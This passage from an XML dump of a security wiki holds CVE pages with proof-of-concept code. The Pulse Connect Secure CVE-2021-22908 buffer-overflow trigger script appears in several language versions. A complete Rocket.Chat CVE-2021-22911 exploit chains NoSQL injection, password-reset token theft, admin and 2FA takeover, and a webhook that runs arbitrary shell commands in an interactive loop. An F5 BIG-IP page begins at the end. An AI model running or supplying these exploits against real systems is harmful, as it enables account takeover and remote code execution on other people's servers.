        'acttype': 'create',
        'xsauth': xsauth,
        'create': 'Create Folder',
        }
    cookies = {'DSID': dsid}
    try:
        res = requests.post(url, data=values, verify=False, allow_redirects=False, cookies=cookies, timeout=60)
        status = res.status_code
        if 'DSIDFormDataStr' in str(res.content):
            # We got page asking to confirm our action
            print('xsauth value was not accepted')
        else:
            if status == 200 and 'Error FB-8' in str(res.content):
                print('HTTP %s.  Windows File Access Policies prevents exploitation.' % status)
            elif status == 200:
                print('HTTP %s.  Not vulnerable.' % status)
            elif status == 403:
                print('HTTP %s.  XML workaround applied.' % status)
            elif status == 500:
                print('HTTP %s.  %s is vulnerable to CVE-2021-22908!' % (status, host))
            elif status == 302:
                print('HTTP %s.  Are you sure your DSID is valid?' % host)
            else:
                print('HTTP %s.  Not sure how to interpret this result.' % status)
    except requests.exceptions.ReadTimeout:
        print('No response from server. Try again...')


def get_default(host):
    url = 'https://%s' % host
    res = requests.get(url, verify=False, allow_redirects=False, timeout=10)
    try:
        location = res.headers['location']
        if 'dana-na' not in location:
            print('%s does not seem to be a PCS host' % host)
            location = None
    except:
        pass
    return location

def check_xml(host):
    url = 'https://%s/dana/meeting' % host
    #print('Checking status of %s ...' % url)
    res = requests.get(url, verify=False, allow_redirects=False, timeout=10)
    if res.status_code == 403:
        print('Workaround-2104 appears to be installed')
    else:
        print('Workaround-2104 does NOT seem to be installed. Hope you are on R11.4 or later!')

    url = 'https://%s/dana-cached/fb/smb/wfmd.cgi' % host
    #print('Checking status of %s ...' % url)
    res = requests.get(url, verify=False, allow_redirects=False, timeout=10)
    if res.status_code == 403:
        print('Workaround-2105 appears to be installed')
    else:
        print('Workaround-2105 does NOT seem to be installed. Hope you are on R11.5 or later!')


host = args.host
if args.noauth:
    check_xml(host)
else:
    defaulturi = get_default(host)
    if defaulturi:

        if not args.realm:
            realm = get_realm(host, defaulturi)
        else:
            realm = args.realm

        if realm:
            print('Realm: %s' % realm)
            if not args.user and not args.dsid:
                user = input('User: ')
            else:
                user = args.user
            if not args.password and not args.dsid:
                password = getpass.getpass()
            else:
                password = args.password
            if not args.dsid:
                dsid = get_dsid(host, defaulturi, realm, user, password)
                print('DSID: %s' % dsid)
            else:
                dsid = args.dsid
            if dsid:
                if not args.xsauth:
                    xsauth = get_xsauth(host, dsid)
                    print('xsauth: %s' % xsauth)
                else:
                    xsauth = args.xsauth
                if xsauth:
                    trigger_vul(host, dsid, xsauth)
&lt;/pre&gt;

== Ссылка ==
https://short.pwnwiki.org/?c=1NiPen

https://short.pwnwiki.org/?c=2Um6Rb</text>
      <sha1>mfs6ljbmsnf5y4fy9vos9jdhw1x66il</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-22908 Pulse Connect Secure 任意代碼執行漏洞/zh-cn</title>
    <ns>0</ns>
    <id>3409</id>
    <revision>
      <id>3974</id>
      <timestamp>2021-06-04T01:58:42Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==参考=="</comment>
      <origin>3974</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="11427" sha1="jl05g4k2eb2em9np74zypboez60otvl" xml:space="preserve">&lt;languages  /&gt;
==漏洞描述==

由于PCS支持连接到Windows文件共享（SMB）的功能由基于Samba 4.5.10的库和辅助应用程序的CGI脚本提供。当为某些SMB操作指定一个长的服务器名称时，smbclt应用程序可能会由于缓冲区溢出而崩溃，具体取决于指定的服务器名称长度。

已经确认PCS 9.1R11.4系统存在此漏洞，目标CGI端点为&lt;code&gt;/dana/fb/smb/wnf.cgi&lt;/code&gt;，其它CGI端点也可能会触发此漏洞。

如果攻击者在成功利用此漏洞后没有进行清理，则指定一个长的服务器名称可能会导致如下PCS事件日志条目：
&lt;pre&gt;
Critical ERR31093 2021-05-24 14:05:37 - ive - [127.0.0.1] Root::System()[] - Program smbclt recently failed.
&lt;/pre&gt;

如果攻击者在成功利用此漏洞后没有进行清理，则指定一个长的服务器名称可能会导致如下PCS事件日志条目：

==影响范围==
Pulse Connect Secure 9.0RX and 9.1RX

==POC==
&lt;pre&gt;
#!/usr/bin/env python3
# Utility to check for Pulse Connect Secure CVE-2021-22908
# https://www.kb.cert.org/vuls/id/667933

import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
import argparse
import sys
from html.parser import HTMLParser
import getpass

parser = argparse.ArgumentParser(description='Pulse Connect Secure CVE-2021-22908')
parser.add_argument('host', type=str, help='PCS IP or hostname)')
parser.add_argument('-u', '--user', dest='user', type=str, help='username')
parser.add_argument('-p', '--pass', dest='password', type=str, help='password')
parser.add_argument('-r', '--realm', dest='realm', type=str, help='realm')
parser.add_argument('-d', '--dsid', dest='dsid', type=str, help='DSID')
parser.add_argument('-x', '--xsauth', dest='xsauth', type=str, help='xsauth')
parser.add_argument('-n', '--noauth', action='store_true', help='Do not authenticate. Only check for XML workaround')

args = parser.parse_args()

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

class formvaluefinder(HTMLParser):
    def __init__(self, searchval):
        super(type (self), self).__init__()
        self.searchval = searchval
    def handle_starttag(self, tag, attrs):
        if tag == 'input':
            # We're just looking for form &lt;input&gt; tags
            foundelement = False
            for attr in attrs:
                if(attr[0] == 'name'):
                    if(attr[1] == self.searchval):
                        foundelement = True
                elif(attr[0] == 'value' and foundelement == True):
                     self.data = attr[1]

class preauthfinder(HTMLParser):
    foundelement = False
    def handle_starttag(self, tag, attrs):
        if tag == 'textarea':
            # We're just looking for &lt;textarea&gt; tags
            foundelement = False
            for attr in attrs:
                if(attr[0] == 'id'):
                    if(attr[1] == 'sn-preauth-text_2'):
                        self.foundelement = True
    def handle_data(self, data):
        if self.foundelement:
            self.data = data
            self.foundelement = False



def get_realm(host, defaulturi):
    realm = None
    print('Getting default realm for %s...' % host)
    url = 'https://%s%s' % (host,defaulturi)
    res = None
    try:
        res = requests.get(url, verify=False, timeout=10)
    except requests.exceptions.ConnectionError:
        print('Error retrieving %s' % url)

    if res:
        if res.status_code == 200:
            html = str(res.content)
            if 'sn-preauth-text_2' in html:
                print('Preauth required...')
                parser = preauthfinder()
                parser.feed(html)
                preauthtext = parser.data
                values = {'sn-preauth-text': preauthtext, 'sn-preauth-proceed': 'Proceed'}
                res = requests.post(res.url, data=values, verify=False, allow_redirects=False, timeout=10)
                if res.content:
                    parser = formvaluefinder('realm')
                    parser.feed(str(res.content))
                    realm = parser.data
                else:
                    print('Error retrieving login page')

            else:
                parser = formvaluefinder('realm')
                parser.feed(html)
                realm = parser.data
    return realm

def get_dsid(host, defaulturi, realm, user, password):
    dsid = None
    loginuri = defaulturi.replace('welcome.cgi', 'login.cgi')
    url = 'https://%s%s' % (host,loginuri)
    values = {'username': user, 'password': password, 'realm': realm, 'btnSubmit': 'Sign In'}
    res = requests.post(url, data=values, verify=False, allow_redirects=False, timeout=10)
    if 'confirm' in res.headers['location']:
        # Redirect to "user-confirm" that they still want to log in, despite already
        # having an active session
        print('User session is already active! Proceeding...')
        res = requests.post(url, data=values, verify=False, allow_redirects=True, timeout=10)
        parser = formvaluefinder('FormDataStr')
        parser.feed(str(res.content))
        formdata = parser.data
        values = {'btnContinue' : 'Continue the session', 'FormDataStr': formdata}
        res = requests.post(url, data=values, verify=False, allow_redirects=False, timeout=10)
        for cookie in res.cookies:
            if cookie.name == 'DSID':
                dsid = cookie.value
    elif 'cred' in res.headers['location']:
        # This is a pulse that requires 2FA
        res = requests.post(url, data=values, verify=False, allow_redirects=False, timeout=10)
        for cookie in res.cookies:
            if cookie.name == 'id':
                key = cookie.value
        password2 = input('MFA code: ')
        values = {'key': key, 'password#2': password2, 'btnSubmit': 'Sign In'}
        cookies = {'id': key, 'DSSigninNotif': '1'}
        res = requests.post(url, data=values, cookies=cookies, verify=False, allow_redirects=False, timeout=10)
        if 'confirm' in res.headers['location']:
            # Redirect to "user-confirm" that they still want to log in, despite already
            # having an active session
            print('User session is already active! Proceeding...')
            res = requests.post(url, data=values, cookies=cookies, verify=False, allow_redirects=True, timeout=10)
            parser = formvaluefinder('FormDataStr')
            parser.feed(str(res.content))
            formdata = parser.data
            values = {'btnContinue' : 'Continue the session', 'FormDataStr': formdata}
            res = requests.post(url, data=values, cookies=cookies, verify=False, allow_redirects=False, timeout=10)
            for cookie in res.cookies:
                if cookie.name == 'DSID':
                    dsid = cookie.value
        else:
            for cookie in res.cookies:
                if cookie.name == 'DSID':
                    dsid = cookie.value
    elif 'failed' in res.headers['location']:
        print('Login failed!')
    else:
        # Login accepted
        for cookie in res.cookies:
            if cookie.name == 'DSID':
                dsid = cookie.value

    return dsid


def get_xsauth(host, dsid):
    xsauth = None
    url = 'https://%s/dana/home/index.cgi' % host
    cookies = {'DSID':dsid}
    res = requests.get(url, verify=False, cookies=cookies, timeout=10)
    if 'xsauth' in str(res.content):
        parser = formvaluefinder('xsauth')
        parser.feed(str(res.content))
        xsauth = parser.data
    else:
        print('Cannot find xsauth string for provided DSID: %s' % dsid)
    return xsauth

def trigger_vul(host, dsid, xsauth):
    url = 'https://%s/dana/fb/smb/wnf.cgi' % host
    values = {
        't': 's',
        'v': '%s,,' % ('A' * 1800),
        'dir': 'tmp',
        'si': None,
        'ri': None,
        'pi': None,
        'confirm': 'yes',
        'folder': 'tmp',
        'acttype': 'create',
        'xsauth': xsauth,
        'create': 'Create Folder',
        }
    cookies = {'DSID': dsid}
    try:
        res = requests.post(url, data=values, verify=False, allow_redirects=False, cookies=cookies, timeout=60)
        status = res.status_code
        if 'DSIDFormDataStr' in str(res.content):
            # We got page asking to confirm our action
            print('xsauth value was not accepted')
        else:
            if status == 200 and 'Error FB-8' in str(res.content):
                print('HTTP %s.  Windows File Access Policies prevents exploitation.' % status)
            elif status == 200:
                print('HTTP %s.  Not vulnerable.' % status)
            elif status == 403:
                print('HTTP %s.  XML workaround applied.' % status)
            elif status == 500:
                print('HTTP %s.  %s is vulnerable to CVE-2021-22908!' % (status, host))
            elif status == 302:
                print('HTTP %s.  Are you sure your DSID is valid?' % host)
            else:
                print('HTTP %s.  Not sure how to interpret this result.' % status)
    except requests.exceptions.ReadTimeout:
        print('No response from server. Try again...')


def get_default(host):
    url = 'https://%s' % host
    res = requests.get(url, verify=False, allow_redirects=False, timeout=10)
    try:
        location = res.headers['location']
        if 'dana-na' not in location:
            print('%s does not seem to be a PCS host' % host)
            location = None
    except:
        pass
    return location

def check_xml(host):
    url = 'https://%s/dana/meeting' % host
    #print('Checking status of %s ...' % url)
    res = requests.get(url, verify=False, allow_redirects=False, timeout=10)
    if res.status_code == 403:
        print('Workaround-2104 appears to be installed')
    else:
        print('Workaround-2104 does NOT seem to be installed. Hope you are on R11.4 or later!')

    url = 'https://%s/dana-cached/fb/smb/wfmd.cgi' % host
    #print('Checking status of %s ...' % url)
    res = requests.get(url, verify=False, allow_redirects=False, timeout=10)
    if res.status_code == 403:
        print('Workaround-2105 appears to be installed')
    else:
        print('Workaround-2105 does NOT seem to be installed. Hope you are on R11.5 or later!')


host = args.host
if args.noauth:
    check_xml(host)
else:
    defaulturi = get_default(host)
    if defaulturi:

        if not args.realm:
            realm = get_realm(host, defaulturi)
        else:
            realm = args.realm

        if realm:
            print('Realm: %s' % realm)
            if not args.user and not args.dsid:
                user = input('User: ')
            else:
                user = args.user
            if not args.password and not args.dsid:
                password = getpass.getpass()
            else:
                password = args.password
            if not args.dsid:
                dsid = get_dsid(host, defaulturi, realm, user, password)
                print('DSID: %s' % dsid)
            else:
                dsid = args.dsid
            if dsid:
                if not args.xsauth:
                    xsauth = get_xsauth(host, dsid)
                    print('xsauth: %s' % xsauth)
                else:
                    xsauth = args.xsauth
                if xsauth:
                    trigger_vul(host, dsid, xsauth)
&lt;/pre&gt;

==参考==
https://short.pwnwiki.org/?c=1NiPen

https://short.pwnwiki.org/?c=2Um6Rb</text>
      <sha1>jl05g4k2eb2em9np74zypboez60otvl</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-22908 Pulse Connect Secure 任意代碼執行漏洞/zh-tw</title>
    <ns>0</ns>
    <id>5031</id>
    <revision>
      <id>5771</id>
      <timestamp>2021-06-24T02:09:14Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==影響範圍=="</comment>
      <origin>5771</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="11699" sha1="h91az9yuh0q2a4esqjjt1t0zt4en4sr" xml:space="preserve">&lt;languages  /&gt;
==漏洞描述==

由於PCS支援連接到Windows文件共享（SMB）的功能由基於Samba 4.5.10的庫和輔助應用程序的CGI腳本提供。當為某些SMB操作指定一個長的伺服器名稱時，smbclt應用程式可能會由於緩衝區溢出而崩潰，具體取決於指定的伺服器名稱長度。

已經確認PCS 9.1R11.4系統存在此漏洞，目標CGI端點為&lt;code&gt;/dana/fb/smb/wnf.cgi&lt;/code&gt;，其它CGI端點也可能會觸發此漏洞。

如果攻擊者在成功利用此漏洞後沒有進行清理，則指定一個長的伺服器名稱可能會導致如下PCS事件日誌條目：
&lt;pre&gt;
Critical ERR31093 2021-05-24 14:05:37 - ive - [127.0.0.1] Root::System()[] - Program smbclt recently failed.
&lt;/pre&gt;

但要利用此漏洞，PCS伺服器必須有一個允許\\*的Windows文件訪問策略或允許攻擊者連接到任意伺服器的其他策略。可以在PCS的管理頁面中，查看用戶-&gt;資源策略-&gt;Windows 文件訪問策略，來查看當前的SMB策略。9.1R2及之前的PCS設備使用允許連接到任意SMB主機的默認策略，從9.1R3開始，這個策略從默認允許更改為默認拒絕。

==影響範圍==
Pulse Connect Secure 9.0RX and 9.1RX

==POC==
&lt;pre&gt;
#!/usr/bin/env python3
# Utility to check for Pulse Connect Secure CVE-2021-22908
# https://www.kb.cert.org/vuls/id/667933

import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
import argparse
import sys
from html.parser import HTMLParser
import getpass

parser = argparse.ArgumentParser(description='Pulse Connect Secure CVE-2021-22908')
parser.add_argument('host', type=str, help='PCS IP or hostname)')
parser.add_argument('-u', '--user', dest='user', type=str, help='username')
parser.add_argument('-p', '--pass', dest='password', type=str, help='password')
parser.add_argument('-r', '--realm', dest='realm', type=str, help='realm')
parser.add_argument('-d', '--dsid', dest='dsid', type=str, help='DSID')
parser.add_argument('-x', '--xsauth', dest='xsauth', type=str, help='xsauth')
parser.add_argument('-n', '--noauth', action='store_true', help='Do not authenticate. Only check for XML workaround')

args = parser.parse_args()

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

class formvaluefinder(HTMLParser):
    def __init__(self, searchval):
        super(type (self), self).__init__()
        self.searchval = searchval
    def handle_starttag(self, tag, attrs):
        if tag == 'input':
            # We're just looking for form &lt;input&gt; tags
            foundelement = False
            for attr in attrs:
                if(attr[0] == 'name'):
                    if(attr[1] == self.searchval):
                        foundelement = True
                elif(attr[0] == 'value' and foundelement == True):
                     self.data = attr[1]

class preauthfinder(HTMLParser):
    foundelement = False
    def handle_starttag(self, tag, attrs):
        if tag == 'textarea':
            # We're just looking for &lt;textarea&gt; tags
            foundelement = False
            for attr in attrs:
                if(attr[0] == 'id'):
                    if(attr[1] == 'sn-preauth-text_2'):
                        self.foundelement = True
    def handle_data(self, data):
        if self.foundelement:
            self.data = data
            self.foundelement = False



def get_realm(host, defaulturi):
    realm = None
    print('Getting default realm for %s...' % host)
    url = 'https://%s%s' % (host,defaulturi)
    res = None
    try:
        res = requests.get(url, verify=False, timeout=10)
    except requests.exceptions.ConnectionError:
        print('Error retrieving %s' % url)

    if res:
        if res.status_code == 200:
            html = str(res.content)
            if 'sn-preauth-text_2' in html:
                print('Preauth required...')
                parser = preauthfinder()
                parser.feed(html)
                preauthtext = parser.data
                values = {'sn-preauth-text': preauthtext, 'sn-preauth-proceed': 'Proceed'}
                res = requests.post(res.url, data=values, verify=False, allow_redirects=False, timeout=10)
                if res.content:
                    parser = formvaluefinder('realm')
                    parser.feed(str(res.content))
                    realm = parser.data
                else:
                    print('Error retrieving login page')

            else:
                parser = formvaluefinder('realm')
                parser.feed(html)
                realm = parser.data
    return realm

def get_dsid(host, defaulturi, realm, user, password):
    dsid = None
    loginuri = defaulturi.replace('welcome.cgi', 'login.cgi')
    url = 'https://%s%s' % (host,loginuri)
    values = {'username': user, 'password': password, 'realm': realm, 'btnSubmit': 'Sign In'}
    res = requests.post(url, data=values, verify=False, allow_redirects=False, timeout=10)
    if 'confirm' in res.headers['location']:
        # Redirect to "user-confirm" that they still want to log in, despite already
        # having an active session
        print('User session is already active! Proceeding...')
        res = requests.post(url, data=values, verify=False, allow_redirects=True, timeout=10)
        parser = formvaluefinder('FormDataStr')
        parser.feed(str(res.content))
        formdata = parser.data
        values = {'btnContinue' : 'Continue the session', 'FormDataStr': formdata}
        res = requests.post(url, data=values, verify=False, allow_redirects=False, timeout=10)
        for cookie in res.cookies:
            if cookie.name == 'DSID':
                dsid = cookie.value
    elif 'cred' in res.headers['location']:
        # This is a pulse that requires 2FA
        res = requests.post(url, data=values, verify=False, allow_redirects=False, timeout=10)
        for cookie in res.cookies:
            if cookie.name == 'id':
                key = cookie.value
        password2 = input('MFA code: ')
        values = {'key': key, 'password#2': password2, 'btnSubmit': 'Sign In'}
        cookies = {'id': key, 'DSSigninNotif': '1'}
        res = requests.post(url, data=values, cookies=cookies, verify=False, allow_redirects=False, timeout=10)
        if 'confirm' in res.headers['location']:
            # Redirect to "user-confirm" that they still want to log in, despite already
            # having an active session
            print('User session is already active! Proceeding...')
            res = requests.post(url, data=values, cookies=cookies, verify=False, allow_redirects=True, timeout=10)
            parser = formvaluefinder('FormDataStr')
            parser.feed(str(res.content))
            formdata = parser.data
            values = {'btnContinue' : 'Continue the session', 'FormDataStr': formdata}
            res = requests.post(url, data=values, cookies=cookies, verify=False, allow_redirects=False, timeout=10)
            for cookie in res.cookies:
                if cookie.name == 'DSID':
                    dsid = cookie.value
        else:
            for cookie in res.cookies:
                if cookie.name == 'DSID':
                    dsid = cookie.value
    elif 'failed' in res.headers['location']:
        print('Login failed!')
    else:
        # Login accepted
        for cookie in res.cookies:
            if cookie.name == 'DSID':
                dsid = cookie.value

    return dsid


def get_xsauth(host, dsid):
    xsauth = None
    url = 'https://%s/dana/home/index.cgi' % host
    cookies = {'DSID':dsid}
    res = requests.get(url, verify=False, cookies=cookies, timeout=10)
    if 'xsauth' in str(res.content):
        parser = formvaluefinder('xsauth')
        parser.feed(str(res.content))
        xsauth = parser.data
    else:
        print('Cannot find xsauth string for provided DSID: %s' % dsid)
    return xsauth

def trigger_vul(host, dsid, xsauth):
    url = 'https://%s/dana/fb/smb/wnf.cgi' % host
    values = {
        't': 's',
        'v': '%s,,' % ('A' * 1800),
        'dir': 'tmp',
        'si': None,
        'ri': None,
        'pi': None,
        'confirm': 'yes',
        'folder': 'tmp',
        'acttype': 'create',
        'xsauth': xsauth,
        'create': 'Create Folder',
        }
    cookies = {'DSID': dsid}
    try:
        res = requests.post(url, data=values, verify=False, allow_redirects=False, cookies=cookies, timeout=60)
        status = res.status_code
        if 'DSIDFormDataStr' in str(res.content):
            # We got page asking to confirm our action
            print('xsauth value was not accepted')
        else:
            if status == 200 and 'Error FB-8' in str(res.content):
                print('HTTP %s.  Windows File Access Policies prevents exploitation.' % status)
            elif status == 200:
                print('HTTP %s.  Not vulnerable.' % status)
            elif status == 403:
                print('HTTP %s.  XML workaround applied.' % status)
            elif status == 500:
                print('HTTP %s.  %s is vulnerable to CVE-2021-22908!' % (status, host))
            elif status == 302:
                print('HTTP %s.  Are you sure your DSID is valid?' % host)
            else:
                print('HTTP %s.  Not sure how to interpret this result.' % status)
    except requests.exceptions.ReadTimeout:
        print('No response from server. Try again...')


def get_default(host):
    url = 'https://%s' % host
    res = requests.get(url, verify=False, allow_redirects=False, timeout=10)
    try:
        location = res.headers['location']
        if 'dana-na' not in location:
            print('%s does not seem to be a PCS host' % host)
            location = None
    except:
        pass
    return location

def check_xml(host):
    url = 'https://%s/dana/meeting' % host
    #print('Checking status of %s ...' % url)
    res = requests.get(url, verify=False, allow_redirects=False, timeout=10)
    if res.status_code == 403:
        print('Workaround-2104 appears to be installed')
    else:
        print('Workaround-2104 does NOT seem to be installed. Hope you are on R11.4 or later!')

    url = 'https://%s/dana-cached/fb/smb/wfmd.cgi' % host
    #print('Checking status of %s ...' % url)
    res = requests.get(url, verify=False, allow_redirects=False, timeout=10)
    if res.status_code == 403:
        print('Workaround-2105 appears to be installed')
    else:
        print('Workaround-2105 does NOT seem to be installed. Hope you are on R11.5 or later!')


host = args.host
if args.noauth:
    check_xml(host)
else:
    defaulturi = get_default(host)
    if defaulturi:

        if not args.realm:
            realm = get_realm(host, defaulturi)
        else:
            realm = args.realm

        if realm:
            print('Realm: %s' % realm)
            if not args.user and not args.dsid:
                user = input('User: ')
            else:
                user = args.user
            if not args.password and not args.dsid:
                password = getpass.getpass()
            else:
                password = args.password
            if not args.dsid:
                dsid = get_dsid(host, defaulturi, realm, user, password)
                print('DSID: %s' % dsid)
            else:
                dsid = args.dsid
            if dsid:
                if not args.xsauth:
                    xsauth = get_xsauth(host, dsid)
                    print('xsauth: %s' % xsauth)
                else:
                    xsauth = args.xsauth
                if xsauth:
                    trigger_vul(host, dsid, xsauth)
&lt;/pre&gt;

==參考==
https://short.pwnwiki.org/?c=1NiPen

https://short.pwnwiki.org/?c=2Um6Rb</text>
      <sha1>h91az9yuh0q2a4esqjjt1t0zt4en4sr</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-22911 Rocket.Chat 3.12.1 RCE漏洞</title>
    <ns>0</ns>
    <id>3646</id>
    <revision>
      <id>4231</id>
      <timestamp>2021-06-07T12:11:55Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==EXP== &lt;pre&gt; # Title: Rocket.Chat 3.12.1 - NoSQL Injection to RCE (Unauthenticated) # Author: enox # Date: 06-06-2021 # Product: Rocket.Chat # Vendor: https://rocket.chat/ #..."</comment>
      <origin>4231</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="6332" sha1="kuhke1nx0mgxf7b95scgr12mo4s9rwh" xml:space="preserve">==EXP==
&lt;pre&gt;
# Title: Rocket.Chat 3.12.1 - NoSQL Injection to RCE (Unauthenticated)
# Author: enox
# Date: 06-06-2021
# Product: Rocket.Chat
# Vendor: https://rocket.chat/
# Vulnerable Version(s): Rocket.Chat 3.12.1
# CVE: CVE-2021-22911
# Credits: https://blog.sonarsource.com/nosql-injections-in-rocket-chat

#!/usr/bin/python

import requests
import string
import time
import hashlib
import json
import oathtool
import argparse

parser = argparse.ArgumentParser(description='RocketChat 3.12.1 RCE')
parser.add_argument('-u', help='Low priv user email [ No 2fa ]', required=True)
parser.add_argument('-a', help='Administrator email', required=True)
parser.add_argument('-t', help='URL (Eg: http://rocketchat.local)', required=True)
args = parser.parse_args()


adminmail = args.a
lowprivmail = args.u
target = args.t


def forgotpassword(email,url):
	payload='{"message":"{\\"msg\\":\\"method\\",\\"method\\":\\"sendForgotPasswordEmail\\",\\"params\\":[\\"'+email+'\\"]}"}'
	headers={'content-type': 'application/json'}
	r = requests.post(url+"/api/v1/method.callAnon/sendForgotPasswordEmail", data = payload, headers = headers, verify = False, allow_redirects = False)
	print("[+] Password Reset Email Sent")


def resettoken(url):
	u = url+"/api/v1/method.callAnon/getPasswordPolicy"
	headers={'content-type': 'application/json'}
	token = ""

	num = list(range(0,10))
	string_ints = [str(int) for int in num]
	characters = list(string.ascii_uppercase + string.ascii_lowercase) + list('-')+list('_') + string_ints

	while len(token)!= 43:
		for c in characters:
			payload='{"message":"{\\"msg\\":\\"method\\",\\"method\\":\\"getPasswordPolicy\\",\\"params\\":[{\\"token\\":{\\"$regex\\":\\"^%s\\"}}]}"}' % (token + c)
			r = requests.post(u, data = payload, headers = headers, verify = False, allow_redirects = False)
			time.sleep(0.5)
			if 'Meteor.Error' not in r.text:
				token += c
				print(f"Got: {token}")

	print(f"[+] Got token : {token}")
	return token


def changingpassword(url,token):
	payload = '{"message":"{\\"msg\\":\\"method\\",\\"method\\":\\"resetPassword\\",\\"params\\":[\\"'+token+'\\",\\"P@$$w0rd!1234\\"]}"}'
	headers={'content-type': 'application/json'}
	r = requests.post(url+"/api/v1/method.callAnon/resetPassword", data = payload, headers = headers, verify = False, allow_redirects = False)
	if "error" in r.text:
		exit("[-] Wrong token")
	print("[+] Password was changed !")


def twofactor(url,email):
	# Authenticating
	sha256pass = hashlib.sha256(b'P@$$w0rd!1234').hexdigest()
	payload ='{"message":"{\\"msg\\":\\"method\\",\\"method\\":\\"login\\",\\"params\\":[{\\"user\\":{\\"email\\":\\"'+email+'\\"},\\"password\\":{\\"digest\\":\\"'+sha256pass+'\\",\\"algorithm\\":\\"sha-256\\"}}]}"}'
	headers={'content-type': 'application/json'}
	r = requests.post(url + "/api/v1/method.callAnon/login",data=payload,headers=headers,verify=False,allow_redirects=False)
	if "error" in r.text:
		exit("[-] Couldn't authenticate")
	data = json.loads(r.text)  
	data =(data['message'])
	userid = data[32:49]
	token = data[60:103]
	print(f"[+] Succesfully authenticated as {email}")

	# Getting 2fa code
	cookies = {'rc_uid': userid,'rc_token': token}
	headers={'X-User-Id': userid,'X-Auth-Token': token}
	payload = '/api/v1/users.list?query={"$where"%3a"this.username%3d%3d%3d\'admin\'+%26%26+(()%3d&gt;{+throw+this.services.totp.secret+})()"}'
	r = requests.get(url+payload,cookies=cookies,headers=headers)
	code = r.text[46:98]
	print(f"Got the code for 2fa: {code}")
	return code


def changingadminpassword(url,token,code):
	payload = '{"message":"{\\"msg\\":\\"method\\",\\"method\\":\\"resetPassword\\",\\"params\\":[\\"'+token+'\\",\\"P@$$w0rd!1234\\",{\\"twoFactorCode\\":\\"'+code+'\\",\\"twoFactorMethod\\":\\"totp\\"}]}"}'
	headers={'content-type': 'application/json'}
	r = requests.post(url+"/api/v1/method.callAnon/resetPassword", data = payload, headers = headers, verify = False, allow_redirects = False)
	if "403" in r.text:
		exit("[-] Wrong token")

	print("[+] Admin password changed !")


def rce(url,code,cmd):
	# Authenticating
	sha256pass = hashlib.sha256(b'P@$$w0rd!1234').hexdigest()
	headers={'content-type': 'application/json'}
	payload = '{"message":"{\\"msg\\":\\"method\\",\\"method\\":\\"login\\",\\"params\\":[{\\"totp\\":{\\"login\\":{\\"user\\":{\\"username\\":\\"admin\\"},\\"password\\":{\\"digest\\":\\"'+sha256pass+'\\",\\"algorithm\\":\\"sha-256\\"}},\\"code\\":\\"'+code+'\\"}}]}"}'
	r = requests.post(url + "/api/v1/method.callAnon/login",data=payload,headers=headers,verify=False,allow_redirects=False)
	if "error" in r.text:
		exit("[-] Couldn't authenticate")
	data = json.loads(r.text)
	data =(data['message'])
	userid = data[32:49]
	token = data[60:103]
	print("[+] Succesfully authenticated as administrator")

	# Creating Integration
	payload = '{"enabled":true,"channel":"#general","username":"admin","name":"rce","alias":"","avatarUrl":"","emoji":"","scriptEnabled":true,"script":"const require = console.log.constructor(\'return process.mainModule.require\')();\\nconst { exec } = require(\'child_process\');\\nexec(\''+cmd+'\');","type":"webhook-incoming"}'
	cookies = {'rc_uid': userid,'rc_token': token}
	headers = {'X-User-Id': userid,'X-Auth-Token': token}
	r = requests.post(url+'/api/v1/integrations.create',cookies=cookies,headers=headers,data=payload)
	data = r.text
	data = data.split(',')
	token = data[12]
	token = token[9:57]
	_id = data[18]
	_id = _id[7:24]

	# Triggering RCE
	u = url + '/hooks/' + _id + '/' +token
	r = requests.get(u)
	print(r.text)

############################################################


# Getting Low Priv user
print(f"[+] Resetting {lowprivmail} password")
## Sending Reset Mail
forgotpassword(lowprivmail,target)

## Getting reset token
token = resettoken(target)

## Changing Password
changingpassword(target,token)


# Privilege Escalation to admin
## Getting secret for 2fa
secret = twofactor(target,lowprivmail)


## Sending Reset mail
print(f"[+] Resetting {adminmail} password")
forgotpassword(adminmail,target)

## Getting reset token
token = resettoken(target)


## Resetting Password
code = oathtool.generate_otp(secret)
changingadminpassword(target,token,code)

## Authenticting and triggering rce

while True:
	cmd = input("CMD:&gt; ")
	code = oathtool.generate_otp(secret)
	rce(target,code,cmd)
&lt;/pre&gt;</text>
      <sha1>kuhke1nx0mgxf7b95scgr12mo4s9rwh</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-22986 F5 BIG-IP iControl RCE漏洞</title>
    <ns>0</ns>
    <id>252</id>
    <revision>
      <id>396</id>
      <timestamp>2021-03-18T09:28:55Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "&lt;languages   /&gt;  &lt;translate&gt; ==漏洞危害== &lt;/translate&gt;  &lt;translate&gt; *執行任意系統命令 *創建或刪除文件 *禁用服務  &lt;/translate&gt;  &lt;translate&gt; ==影響版..."</comment>
      <origin>396</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="1376" sha1="9znpkm7pjhcf5dyvg4pexevlfmu3bjl" xml:space="preserve">&lt;languages   /&gt;

&lt;translate&gt;
==漏洞危害==
&lt;/translate&gt;

&lt;translate&gt;
*執行任意系統命令
*創建或刪除文件
*禁用服務 
&lt;/translate&gt;

&lt;translate&gt;
==影響版本==
&lt;/translate&gt;
&lt;pre&gt;
BIG-IP (LTM, AAM, Advanced WAF, AFM, Analytics, APM, ASM, DDHD, DNS, FPS, GTM, Link Controller, PEM, SSLO) 	16.x 	16.0.0 – 16.0.1 	16.0.1.1
BIG-IP (LTM, AAM, Advanced WAF, AFM, Analytics, APM, ASM, DDHD, DNS, FPS, GTM, Link Controller, PEM, SSLO) 	15.x 	15.1.0 – 15.1.2 	15.1.2.1
